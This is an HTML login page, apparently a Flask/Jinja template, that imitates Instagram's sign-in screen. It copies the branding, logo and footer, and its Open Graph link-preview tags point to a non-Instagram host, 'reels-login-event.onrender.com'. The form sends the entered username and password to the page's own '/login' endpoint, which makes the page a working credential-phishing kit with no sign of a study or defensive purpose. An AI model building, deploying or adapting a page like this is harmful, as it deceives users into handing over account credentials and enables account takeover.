<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>

  <!-- ✅ Open Graph Meta Tags for Link Previews -->
  <meta property="og:title" content="Instagram" />
  <meta property="og:description" content="Instagram is a free, online photo and video sharing social networking service. It allows users to create, edit, and share visual content with their followers, both publicly and privately, and also offers features like stories (ephemeral content), direct messaging, and the ability to engage with other users through likes and comments. " />
  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSR3Z-GDsXgB-YxLk6GPYeih1tYyFPJcR0dA-fv1Mzg9ime2ozKod_UIHcc&s=10" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://reels-login-event.onrender.com" />

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background-color: #fafafa;
      font-family: Arial, sans-serif;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }

    .content-wrapper {
      display: flex;
      flex-direction: column;
      width: 100%;
      max-width: 350px;
    }

    .left-image {
      display: none;
    }

    @media(min-width: 768px) {
      .container {
        flex-direction: row;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 40px;
      }

      .content-wrapper {
        flex-direction: row;
        max-width: none;
        background-color: #fff;
        border: 1px solid #dbdbdb;
      }

      .left-image {
        display: block;
        width: 300px;
        height: 500px;
        background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGazbx8yWs0ifjPwW3duuezF_2d48EesNQBQ&usqp=CAU');
        background-size: cover;
        background-position: center;
        flex-shrink: 0;
      }

      .right-form {
        flex: 1;
      }
    }

    .right-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
      width: 100%;
    }

    .login-container {
      width: 100%;
      max-width: 350px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px 20px 20px;
      text-align: center;
      margin-bottom: 10px;
    }

    .logo img {
      width: 180px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
      font-size: 14px;
    }

    .password-field {
      position: relative;
      width: 100%;
    }

    .password-field input {
      padding-right: 50px;
    }

    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #00376b;
      font-size: 14px;
      cursor: pointer;
      user-select: none;
    }

    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background-color: #3897f0;
      border: none;
      border-radius: 3px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      background-color: #b2dffc;
      cursor: not-allowed;
    }

    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 13px;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .divider:not(:empty)::before {
      margin-right: 10px;
    }

    .divider:not(:empty)::after {
      margin-left: 10px;
    }

    .fb-login {
      background-color: #4267b2;
      text-decoration: none;
      display: inline-block;
      color: white;
      padding: 10px;
      border-radius: 3px;
      font-weight: bold;
      margin-top: 10px;
    }

    .forgot {
      margin-top: 15px;
      font-size: 12px;
    }

    .forgot a {
      color: #00376b;
      text-decoration: none;
      font-weight: bold;
    }

    .signup {
      text-align: center;
      margin-top: 20px;
      padding: 20px;
      border: 1px solid #dbdbdb;
      background-color: #fff;
      font-size: 14px;
      max-width: 350px;
      width: 100%;
    }

    .signup a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }

    .get-app {
      text-align: center;
      font-size: 14px;
      color: #262626;
      margin-top: 20px;
      max-width: 350px;
      width: 100%;
    }

    .app-badges {
      margin-top: 10px;
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
    }

    .app-badges img {
      height: 40px;
      max-width: 140px;
      width: auto;
      object-fit: contain;
    }

    footer {
      text-align: center;
      padding: 20px;
      font-size: 12px;
      color: #8e8e8e;
      max-width: 350px;
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="content-wrapper">
      <div class="left-image"></div>
      <div class="right-form">
        <div class="login-container">
          <div class="logo">
            <img src="https://www.pngarts.com/files/4/Instagram-PNG-Background-Image.png" alt="Instagram Logo">
          </div>
          {% if error %}
          <div class="error-message">{{ error }}</div>
          {% endif %}
          <form id="loginForm" action="/login" method="POST">
            <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
            <div class="password-field">
              <input type="password" id="password" name="password" placeholder="Password" required>
              <span class="toggle-password" onclick="togglePassword()">Show</span>
            </div>
            <button id="loginBtn" type="submit" disabled>Log In</button>
          </form>
          <div class="forgot">
            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a>
          </div>
          <div class="divider">OR</div>
          <a class="fb-login" href="https://www.facebook.com/login/" target="_blank">Log in with Facebook</a>
        </div>
        <div class="signup">
          Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
        <div class="get-app">
          Get the app.
          <div class="app-badges">
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
              <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
            </a>
            <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1280px-Download_on_the_App_Store_Badge.svg.png" alt="Download on the App Store">
            </a>
          </div>
        </div>
        <footer>
          © 2025 Instagram from Meta • All rights reserved.
        </footer>
      </div>
    </div>
  </div>
  <script>
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');

    function validateForm() {
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      loginBtn.disabled = !(email !== '' && password.length >= 6);
    }

    emailInput.addEventListener('input', validateForm);
    passwordInput.addEventListener('input', validateForm);

    function togglePassword() {
      const passwordField = document.getElementById('password');
      const toggleBtn = document.querySelector('.toggle-password');
      if (passwordField.type === 'password') {
        passwordField.type = 'text';
        toggleBtn.textContent = 'Hide';
      } else {
        passwordField.type = 'password';
        toggleBtn.textContent = 'Show';
      }
    }
  </script>
</body>
</html>
